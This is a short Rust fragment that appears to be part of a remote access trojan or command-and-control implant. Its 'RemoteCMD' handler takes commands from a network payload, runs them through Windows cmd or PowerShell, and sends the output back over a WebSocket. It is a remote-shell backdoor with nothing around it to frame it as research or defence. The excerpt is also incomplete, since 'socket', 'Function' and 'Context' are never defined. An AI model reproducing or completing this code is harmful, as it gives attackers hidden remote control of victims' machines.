use std::net::TcpStream;
use std::process::Command;
use tungstenite::stream::MaybeTlsStream;
use tungstenite::{Message, WebSocket};

struct RemoteCMD;
impl Function for RemoteCMD {
    fn handler(payload: &[u8], ctx: &mut Context) {
        let cmd = String::from_utf8_lossy(&payload[1..]);
        let mut mode = ("cmd", "/C");
        if payload[0] == b'1' {
            mode = ("powershell", "-Command");
        };
        let output = Command::new(mode.0)
            .arg(mode.1)
            .arg(&*cmd)
            .output()
            .expect("Failed to execute command");
        let response = String::from_utf8_lossy(&output.stdout);
        socket
            .send(Message::from(response.to_string()))
            .expect("Failed to send response");
    }
}
